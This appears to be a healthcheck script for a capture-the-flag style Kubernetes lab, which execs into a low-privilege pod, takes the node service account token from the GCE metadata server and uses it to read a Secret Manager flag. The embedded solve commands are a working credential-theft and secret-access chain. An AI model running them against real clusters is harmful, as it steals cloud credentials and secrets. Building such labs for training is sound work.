#!/usr/bin/env bash
# h03 healthcheck (needs the live GKE cluster). From the low-priv pod: confirm the
# pod's own WI identity CANNOT read the secret, then steal the NODE SA token via the
# exposed GCE metadata and read the secret with it.
set -euo pipefail
source "$(git rev-parse --show-toplevel)/shared/lib/common.sh"; load_env
NS="${TEAM_NS:-team01}"

read -r -d '' SOLVE <<'SH' || true
set -e
MD=http://metadata.google.internal/computeMetadata/v1
# the NODE SA token (node pool exposes GCE metadata)
TOK=$(curl -s -H "Metadata-Flavor: Google" \
  "$MD/instance/service-accounts/default/token" | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p')
curl -s -H "Authorization: Bearer $TOK" \
  "https://secretmanager.googleapis.com/v1/projects/$(curl -s -H 'Metadata-Flavor: Google' $MD/project/project-id)/secrets/pearl-core-flag/versions/latest:access" \
  | sed -n 's/.*"data":"\([^"]*\)".*/\1/p' | base64 -d
SH

OUT="$(kubectl -n "$NS" exec frontend -- sh -c "$SOLVE" 2>/dev/null || true)"
echo "recovered: $OUT"
echo "$OUT" | grep -qE "${FLAG_PREFIX}\{" && { echo "h03 healthcheck rc=0"; exit 0; }
echo "h03 healthcheck FAILED"; exit 1
